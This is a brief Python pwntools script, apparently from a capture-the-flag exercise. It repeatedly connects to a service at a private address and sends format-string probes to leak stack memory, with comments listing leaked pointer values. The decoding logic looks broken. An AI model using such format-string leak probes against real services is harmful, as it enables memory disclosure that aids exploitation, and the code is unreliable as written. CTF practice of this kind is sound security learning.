from pwn import *
import base64

arr = []

for x in range(10):
	p = remote('10.6.0.2',7777)
	p.sendline("%{}$30p".format(x+1))
	temp = p.recv()
	print(temp)

	if temp  != "(nil)":
		arr += ("{0:b}".format(base64.b16decode(temp)))



# for m in arr:
# 	print(m)


print(arr[0])



# 0x80486b0 0xf77b5c20 (nil) (nil) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 
# 0x932e7b00 0x8048620 (nil) (nil) 0xf7552ad3 0x1 0xffe7ed34 0xffe7ed3c 0xf76fdcca 0x1 0xffe7ed34 0xffe7ecd4 


# temp = p.recv()
# line = list(temp)

# # n = 9

# #print(temp.split("0x"))

# arr = []


# for x in range(len(line)):

# 	if(line[x] == "0" and line[x+1] == "x"):
# 		str = "0x"
# 		for l in range(8):
# 			str += line[x+2+l]
# 		arr.append(str)




